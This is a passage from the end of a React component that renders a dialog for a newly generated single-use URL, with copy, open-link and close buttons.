                >
                  {copySuccess ? (
                    <Check className="h-4 w-4 text-green-500" />
                  ) : (
                    <Copy className="h-4 w-4 text-gray-500" />
                  )}
                </Button>
              </div>
              <p className="text-sm text-amber-600">
                <strong>Important:</strong> This URL is single-use. Save it
                before closing.
              </p>
            </div>
            <DialogFooter className="gap-2">
              <Button
                variant="outline"
                type="button"
                onClick={() =>
                  window.open(newUrl, "_blank", "noopener,noreferrer")
                }
                className="bg-white border-gray-300"
              >
                Open Link
              </Button>
              <Button
                type="button"
                onClick={() => setNewUrlDialogOpen(false)}
                className="bg-white border-gray-300"
              >
                Close
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
